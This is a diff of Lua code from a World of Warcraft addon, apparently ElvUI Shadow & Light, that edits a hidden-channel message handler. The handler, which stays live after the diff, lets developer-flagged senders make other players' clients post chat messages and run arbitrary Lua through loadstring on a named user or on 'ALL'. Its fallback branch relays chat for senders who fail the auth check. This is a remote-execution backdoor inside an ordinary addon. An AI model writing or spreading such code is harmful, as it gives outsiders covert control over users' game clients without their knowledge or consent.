@@ -128,17 +128,16 @@ end
 local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname.."-"..E.myrealm:gsub(' ','') then return end
-		if (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and SLE:Auth(sender) --[[and not SLE:Auth() ]]then
+		if (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and SLE:Auth(sender) and not SLE:Auth() then
 			if prefix == 'SLE_DEV_SAYS' then
-				print(message)
 				local user, channel, msg, sendTo = split("#", message)
 				
-				if (user ~= 'ALL' and (user == E.myname or user == E.myname.."-"..E.myrealm:gsub(' ',''))) or user == 'ALL' then
+				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
 					SendChatMessage(msg, channel, nil, sendTo)
 				end
 			else
 				local user, executeString = split("#", message)
-				if (user ~= 'ALL' and (user == E.myname or user == E.myname.."-"..E.myrealm:gsub(' ',''))) or user == 'ALL' then
+				if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
 					local func, err = loadstring(executeString);
 					if not err then
 						SLE:Print(format("Developer Executed: %s", executeString))
@@ -169,7 +168,7 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 					BNSendGameData(presenceID, 'SLE_DEV_INFO', message)
 				end
 			end
-		elseif (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') --[[and not SLE:Auth()]] then
+		elseif (prefix == 'SLE_DEV_SAYS' or prefix == 'SLE_DEV_CMD') and not SLE:Auth() then
 			if prefix == 'SLE_DEV_SAYS' then
 				local _, channel, msg, sendTo = split("#", message)
 				SendChatMessage(msg, channel, nil, sendTo)
